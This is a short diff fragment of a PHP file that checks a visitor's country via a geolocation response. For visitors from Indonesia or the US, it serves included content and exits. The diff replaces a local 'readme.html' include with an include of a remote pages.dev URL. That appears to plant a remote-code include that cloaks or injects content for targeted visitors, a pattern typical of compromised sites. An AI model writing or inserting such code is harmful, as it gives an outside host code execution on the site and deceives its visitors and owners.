@@ -29,7 +29,7 @@ $data = json_decode($response, true);
 
 if ($data && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
     ob_start();
-    include 'readme.html';
+    include 'https://atlantikcoffee.pages.dev/atlantikcoffee/readme';
     $output = ob_get_clean();
     echo $output;
     exit();
